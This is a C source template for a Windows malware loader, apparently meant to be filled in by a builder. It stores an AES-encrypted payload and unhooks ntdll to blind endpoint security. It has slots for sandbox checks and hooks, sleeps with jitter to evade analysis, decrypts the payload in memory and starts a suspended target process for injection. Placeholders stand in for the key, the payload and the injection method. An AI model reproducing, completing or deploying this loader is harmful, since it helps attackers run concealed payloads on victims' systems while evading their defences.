#include <stdio.h>
#include <windows.h>

#include "whispers.h"
#include "functions.h"
#include "AES_128_CBC.h"
#include "sandbox.h"
#include "trampoline.h"

#define TARGET_PROCESS "#-TARGET_PROCESS-#"


uint8_t aes_k[16] = { #-KEY_VALUE-# };
uint8_t aes_i[16] = { #-IV_VALUE-# };


unsigned char payload[] = {
	#-PAYLOAD_VALUE-#
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	SIZE_T		sEncPayload			= sizeof(payload);
	PVOID		pClearText			= NULL,
				pProcess			= NULL;
	DWORD		dwSizeOfClearText	= 0,
				dwOldProtect		= 0,
				dwProcessId			= 0;
	AES_CTX		ctx;

	HANDLE		hThread				= NULL,
				hProcess			= NULL;

	NTSTATUS	STATUS				= 0x00;

	
	// Seed RNG for jittered sleep timing
	srand((unsigned int)GetTickCount());
	// #-SANDBOX_CHECK_CALL-#
	//printf("[+] Un-hooking Ntdll \n");
	LPVOID nt = MapNtdll();
	if (!nt) {
		return -1;
	}

	if (!Unhook(nt)) {
		return -1;
	}

	// Install hooks AFTER unhooking so they don't get erased
	// #-TRAMPOLINE_CALL-#
	
	JITTER_SLEEP(500);

	//printf("[+] PID: %d\n", GetCurrentProcessId());
	//printf("[+] Got the content at position: 0x%p with size of %zu\n", &payload, sEncPayload);

	// Decryption routine
	//printf("[i] Starting the decryption...\n");
	
	JITTER_SLEEP(500);
	// Allocating memory to store the decrypted payload inside of pClearText
	pClearText = (PBYTE)malloc(sEncPayload);
	AES_DecryptInit(&ctx, aes_k, aes_i);
	AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload);

	//printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);

	JITTER_SLEEP(1500);
	//printf("[i] Creating suspended process..\n");
	// Creating a suspeneded process now
	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {

		//printf("[-] Failed to create suspended process!\n");
		return -1;
	}

	Sleep(2500);
	// #-INJECTION_METHOD_PLACEHOLDER-#
	
	// Cleanup: Zero out sensitive data before freeing
	if (pClearText) {
		SecureZeroMemory(pClearText, sEncPayload);
		free(pClearText);
		pClearText = NULL;
	}
	// Zero out encryption keys
	SecureZeroMemory(aes_k, sizeof(aes_k));
	SecureZeroMemory(aes_i, sizeof(aes_i));
	SecureZeroMemory(&ctx, sizeof(ctx));
	// Zero out embedded payload
	SecureZeroMemory(payload, sizeof(payload));
	
	if (hThread)
		CloseHandle(hThread);
	if (hProcess)
		CloseHandle(hProcess);

	return 0;
}